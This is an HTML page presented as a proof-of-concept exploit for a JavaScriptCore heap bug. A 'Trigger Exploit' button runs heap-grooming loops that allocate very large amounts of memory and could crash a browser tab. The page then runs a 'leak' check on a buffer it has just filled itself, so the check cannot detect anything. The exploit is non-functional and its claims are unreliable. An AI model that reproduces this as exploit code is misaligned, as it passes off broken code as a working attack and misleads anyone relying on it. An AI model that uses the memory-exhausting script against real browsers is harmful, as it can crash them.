<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>JSC Heap Growth PoC</title>
    <style>
        #trigger {
            margin: 20px;
            padding: 8px;
            font-size: 16px;
            cursor: pointer;
            background-color: #f44336;
            color: white;
            border: none;
            border-radius: 4px;
        }
        #trigger:hover {
            background-color: #d32f2f;
        }
    </style>
</head>
<body>
    <h1>JSC Heap Growth PoC</h1>
    <p>Click to test heap growth vulnerability</p>
    <button id="trigger">Trigger Exploit</button>
    <script>
        function stressHeap() {
            const buffers = [];
            for (let i = 0; i < 100; i++) {
                const buf = new Uint8Array(32 * 1024);
                buf.fill(0x41);
                buffers.push(buf);
            }
            return buffers;
        }

        function createLargeObject() {
            const obj = {};
            for (let i = 0; i < 1000; i++) {
                obj[`key${i}`] = new Array(1000).fill('A');
            }
            return obj;
        }

        function triggerExploit() {
            alert('Grooming heap...');
            stressHeap();

            alert('Creating large objects...');
            const objects = [];
            for (let i = 0; i < 200; i++) {
                objects.push(createLargeObject());
            }

            alert('Forcing GC cycles...');
            for (let i = 0; i < 100; i++) {
                const temp = new ArrayBuffer(64 * 1024);
                objects.push(temp);
            }

            alert('Checking memory changes...');
            const buf = new Uint8Array(4);
            buf.fill(0x46);
            if (buf[0] !== 0x46) {
                alert(`Leak: 0x${buf[0].toString(16)}`);
            } else {
                alert('No memory changes detected');
            }
        }

        document.getElementById('trigger').addEventListener('click', triggerExploit);
    </script>
</body>
</html>
